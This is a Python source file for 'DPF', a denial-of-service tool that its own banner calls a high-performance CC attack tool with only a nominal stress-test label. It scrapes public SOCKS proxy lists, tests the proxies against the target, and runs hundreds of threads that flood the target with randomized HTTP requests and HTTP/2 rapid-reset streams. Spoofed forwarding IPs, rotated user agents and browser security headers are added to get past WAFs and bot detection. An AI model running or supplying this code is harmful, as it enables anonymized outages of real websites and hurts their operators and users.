import ssl
import sys
import time
import socks
import socket
import random
import requests
import threading
from queue import Queue
from h2.connection import H2Connection
from h2.config import H2Configuration


# ------------------ 設定 ------------------

rand = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
rInt = random.randint
rC = random.choice
lock = threading.Lock()
q = Queue()
th_list = []
thread_pool = []
download_proxy = []
worked_proxy = []
good_proxies = []
conns = 0
brute = False
cdn = False
pps = False
ua_list = open('useragent.txt').readlines() # 測試用的 用網路上的列表即可, 不然這種網上的列表 基本都會被WAF規則擋下來
proxy_file = "proxies.txt"
output_file = "dpf.txt"

# ------------------------------------------


def is_valid_proxy_format(proxy): #檢測是否為正確的proxy格式
    try:
        proxy_ip, proxy_port = proxy.strip().split(":")
        int(proxy_port)
        return True
    except:
        return False

def check_proxy(proxy): # 檢測proxy的TCP connection跟HTTP REQUESTS
    global conns
    proxy_ip, proxy_port = proxy.strip().split(":")
    proxy_port = int(proxy_port)

    s = socks.socksocket()
    s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
    s.settimeout(1)

    try:
        s.connect((host, port))
        if port == 443:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=host)
        s.send(f"HEAD / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode('utf-8'))

        with lock:
            conns += 1
            good_proxies.append(proxy)
            print(f"[DPF]->proxy: \033[35m{proxy_ip:^15s}\033[0m port: \033[33;1m{str(proxy_port):^5s}\033[0m conns: \033[34m{str(conns):^4s}\033[0m >{proto:^5s} \033[32;1mConnected\033[0m")
            print(f'\33]0;[{conns}] Proxies Connected | ProxyChecker Code By GogoZin\a',end='')
    except Exception as e:
        pass
        # print(f"[-] FAIL: {proxy} ({e})")
    finally:
        s.close()

def Proxy_worker(): # 騷操作 多這步 檢測就快了
    while not q.empty():
        proxy = q.get()
        check_proxy(proxy)
        q.task_done()

def load_proxies(): # 加載proxy列表
    with open(proxy_file) as f:
        raw = [line.strip() for line in f if line.strip()]
    return [p for p in raw if is_valid_proxy_format(p)]

def launchChecker(): # 開始檢測proxy
    proxies = load_proxies()
    for proxy in proxies:
        q.put(proxy)

    threads = []
    for _ in range(min(600, len(proxies))):
        t = threading.Thread(target=Proxy_worker)
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    # 儲存成功代理
    with open(output_file, "w") as f:
        for proxy in sorted(set(good_proxies)):
            f.write(proxy + "\n")

    print(f"\n✅ 檢測完成！成功: {len(good_proxies)}, 失敗: {len(proxies) - len(good_proxies)}")
    time.sleep(3)


def GetReferer():
    referers = [ #一些常見的搜尋引擎referer, 現在很少有機制針對referer了 可有可無
        f'https://www.google.com/search?q={host}',
        f'https://www.bing.com/search?q={host}',
        f'https://tw.search.yahoo.com/search?p={host}',
        f'https://duckduckgo.com/?t=h_&q={host}'
    ]

    return random.choice(referers)


def fakeIP(): #假IP 專幹那些低能後端工程師
    ip = ""
    for _ in range(4):
        ip += f".{random.randint(0,254)}"
        # 別懷疑 就是會有低能白癡後端 覺得後台看到的IP會是真的 
        # 這邊觀念宣導, 資料庫抓到的ip 不管從哪個標頭抓的 全部都是可以偽造的
        # X-forwarded-For, Client-IP, Via 等等 數不清的標頭 IP全部都可以偽造
        # 任何傳到後端的資料都是可以經過偽造的 切記 !
        # 只有TCP連線那個IP 才是真的流量來源 (如果是cc就會是代理的IP, botnet就會是bot的ip)
    return ip[1:] # 123.123.123.123


def headerHandle(): #封包標頭處理

    # Http 一般標頭 包含常見的connection跟accept等 
    # 如果網站不在任何雲端節點上 那這些標頭就可以實現癱瘓
    conn = f"Connection: Keep-Alive:823\r\n"
    accept = f"Accept: */*\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nAccept-Language: zh-TW,zh;q=0.5\r\n"
    referer = f"Referer: {GetReferer()}\r\n"
    useragent = f"User-Agent: {random.choice(ua_list).strip()}\r\n"
    x_for = f"X-Forwarded-For: {fakeIP()}\r\nClient-IP: {fakeIP()}\r\nVia: {fakeIP()}\r\n"
    cache = f"Cache-Control: no-cache, max-age=0\r\n"
    pri = f"Priority: u=1, i\r\n"
    origin = f"Origin: "
    if port == 443:
        origin += f"https://{host}\r\n"
    else:
        origin += f"http://{host}\r\n"

    # Http 安全性標頭, 大部分主流的瀏覽器都支援了, 是判斷為正常流量 或是機器人的標準之一
    # 新的站點大部分都是預設啟用sec的, 也就是沒有sec的都會被識別為惡意流量
    sec = f"Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"\r\n"
    sec += f"Sec-Ch-Ua-arch: \"x86\"\r\n"
    sec += f"Sec-Ch-Ua-bitness: \"64\"\r\n"
    sec += f"Sec-Ch-Ua-full-version-list: \"Chromium\";v=\"136.0.0.0\", \"Brave\";v=\"136.0.0.0\", \"Not.A/Brand\";v=\"99.0.0.0\"\r\n"
    sec += f"Sec-Ch-Ua-mobile: ?0\r\n"
    sec += f"Sec-Ch-Ua-model: \"\"\r\n"
    sec += f"Sec-Ch-Ua-platform: \"Windows\"\r\n"
    sec += f"Sec-Ch-Ua-platform-version: \"19.0.0\"\r\n"
    sec += f"Sec-Ch-Ua-wow64: ?0\r\n"
    sec += f"Sec-Fetch-Dest: empty\r\n"
    sec += f"Sec-Fetch-Mode: cors\r\n"
    sec += f"Sec-Fetch-Site: same-origin\r\n"
    sec += f"Sec-Gpc: 1\r\n"

    header = conn + accept + referer + useragent + x_for + cache + pri + origin
    if brute: #如果啟用brute 就最大程度減少標頭 只留關鍵標頭
        header = conn + cache + useragent
    if cdn == 'bypass': #如果是bypass模式 那就必須加入sec
        header +=sec
    return header #回傳處理好的標頭


def s5Scraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k的列表 延遲低於1秒 能用的都不會超過400個
    global download_proxy
    print("Auto Proxy Scraper Code By GogoZin")
    time.sleep(2)
    s5URL = ["https://www.proxy-list.download/api/v1/get?type=socks5",
             "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all",
             "https://api.proxyscrape.com/v2/?request=displayproxies",
             "https://www.proxy-list.download/api/v1/get?type=socks4"
             ]
    # vipURL = ["https://dstat.vip/download-proxies?protocol=all",
    #          "https://dstat.vip/download-proxies?protocol=socks5",
    #          "https://dstat.vip/download-proxies?protocol=socks4",
    #          "https://dstat.vip/download-proxies?protocol=scraped"]
    
    print("Start Fetch Socks5 Proxies")
    for u in s5URL:
        r = requests.get(u)
        if r.status_code == 200:
            print(f"[DPF]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
            lst = r.text.split("\r\n")
            for lines in lst:
                if len(lines) > 10 and len(lines) < 22:
                    download_proxy.append(lines)
    
    # print("Start Fetch VIP Proxies")
    # for u in vipURL:
    #     cs = cloudscraper.create_scraper()
    #     r = cs.get(u)
    #     if r.status_code == 200:
    #         print(f"[DPF]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
    #         lst = r.text.split("\r\n")
    #         for lines in lst:
    #             if len(lines) > 10 and len(lines) < 22:
    #                 download_proxy.append(lines)
    #     else:
    #         print(f"[DPF]->status: \033[31;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
    
    print("Start fetch from geonode ")
    geo = ["https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
           "https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500&page=2&sort_by=lastChecked&sort_type=desc",
           "https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500&page=3&sort_by=lastChecked&sort_type=desc"]
    for u in geo:
        r = requests.get(u)
        if r.status_code == 200:
            lst = r.text.split("}")
            # print(lst)
            for lines in lst:
                # print(lines)
                if "ip" and "port" in lines:
                    ip = lines.split("ip\":\"")[1].split("\",\"")[0]
                    port = lines.split("port\":\"")[1].split("\",\"")[0]
                    proxy = ip+":"+port
                download_proxy.append(proxy)
            
        print(f"[DPF]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
    
    git_proxy_list = [                 #Github proxies is suck, so don't use it
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/refs/heads/master/socks5.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/refs/heads/master/generated/socks5_proxies.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/refs/heads/main/SOCKS5_RAW.txt",
    ]

    print("Start Get Github Proxies")
    for u in git_proxy_list:
        host = u.split(".com/")[1]
        r = requests.get(u)
        if r.status_code == 200:
            print(f"[DPF]->status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
            lst = r.text.split("\n")
            for lines in lst:
                if len(lines) > 10 and len(lines) < 22:
                    download_proxy.append(lines)
    
    download_proxy = sorted(set(download_proxy))


def banner(): # DPF 2025年最高效能的CC ATTACK STRESS TEST工具
    print(f"""

            ╔╦╗┬┌─┐┌┬┐┬─┐┬┌┐ ┬ ┬┌┬┐┌─┐┌┬┐                     
             ║║│└─┐ │ ├┬┘│├┴┐│ │ │ ├┤  ││                     
            ═╩╝┴└─┘ ┴ ┴└─┴└─┘└─┘ ┴ └─┘─┴┘                     
          ╔═╗┬─┐┌─┐─┐ ┬┬ ┬  ╔═╗┬  ┌─┐┌─┐┌┬┐
          ╠═╝├┬┘│ │┌┴┬┘└┬┘  ╠╣ │  │ ││ │ ││
          ╩  ┴└─└─┘┴ └─ ┴   ╚  ┴─┘└─┘└─┘─┴┘
DPF is a high performance CC attack tool, Code By GogoZin
          You can use it on web stress test 
       If you like this script, give me a star  :)
""")


def joinThreads():
    time.sleep(1)
    while 1:
        if len(th_list) > 0:
            for th in th_list:
                try:
                    th.join()
                except AttributeError:
                    pass
        time.sleep(5)


def launchThreads():
    for _ in range(thr):
        try:
            if version == "http":
                t = threading.Thread(target=send_requests)
            else:
                t = threading.Thread(target=send_rst)
            t.start()
            th_list.append(t)
        except:
            pass


def send_rst(): #Send http2 requests with rst_stream (已失效)
    try:
        proxy_ip, proxy_port = random.choice(worked_proxy).split(":")
        proxy_port = int(proxy_port)
    except ValueError:
        return
    while 1:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
            s.connect((host, port))
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=host)
            try:
                config = H2Configuration(client_side=True)
                conn = H2Connection(config=config)
                conn.initiate_connection()
                s.sendall(conn.data_to_send())
                try:
                    sid_lst = []
                    for _ in range(100):
                        p = path + "?" + rC(rand) + "=" + str(rInt(1,65535))
                        sid = 1 + 2 * _
                        sid_lst.append(sid)
                        conn.send_headers(sid, [(":method", "GET"),
                                                (":authority", host),
                                                (":path", p),
                                                (":scheme", proto),
                                                ("Cache-Control","no-Cahe, max-age=0")
                                                ],
                                                end_stream=True)
                        s.send(conn.data_to_send())
                    for sid in sid_lst:
                        conn.reset_stream(sid)
                        s.send(conn.data_to_send())
                        print(f"[DPFh2]->Proxy {str(proxy_ip):^15s} RST_STREAM #{str(sid):^5s} > {host}")
                    s.close()
                except:
                    s.close()
            except:
                s.close()
        except:
            s.close()
    return


def send_requests(): #傳統HTTP FLOOD
    try:
        proxy_ip, proxy_port = random.choice(good_proxies).split(":")
        proxy_port = int(proxy_port)
    except ValueError:
        return
    if pps:
        header = headerHandle()
    else:
        header = "Connection: Keep-Alive\r\n"
    header += f'\r\n'
    while 1:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.set_proxy(p_Type, proxy_ip, proxy_port)
            s.connect((host, port))
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=host)
            try:
                for _ in range(100):
                    s.send(f"{method} {path}?{rC(rand)}{rC(rand)}={rInt(1,123456789)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode('utf-8'))
                print(f"[DPF]->stress \033[36m{host}\033[0m from: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
                s.close()
            except:
                print(f"[DPF]->proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                s.close()
        except:
            s.close()
    return


if __name__ == '__main__':
    if len(sys.argv) < 7:
        banner()
        print("Usage : DPF.py <GET/POST/HEAD> <host> <port> <threads> <path> <http/http2>")
        print(" --fetch  | For fetch proxies auto")
        sys.exit()
    else:
        banner()
        try:
            if '--pps' in sys.argv:
                pps = True
            if '--brute' in sys.argv:
                brute = True
            if '--cdn' in sys.argv:
                cdn = True
            p_Type = socks.SOCKS5
            method = str(sys.argv[1])
            host = str(sys.argv[2])
            port = int(sys.argv[3])
            if port == 443:
                proto = "HTTPS"
            else:
                proto = "HTTP"
            thr = int(sys.argv[4])
            if thr > 800:
                thr = 800
            else:
                thr = thr
            path = str(sys.argv[5])
            version = str(sys.argv[6])
        except Exception as e:
            print(f"Argv Error : {e}")
            sys.exit()
        if "--fetch" in sys.argv:
            s5Scraper()
            f = open('proxies.txt','w')
            for l in download_proxy:
                f.write(f"{l}\n")
            f.close()
        else:
            download_proxy = open(str(input("Enter Your Proxy List File Name : "))).readlines()
        launchChecker()
        launchThreads()
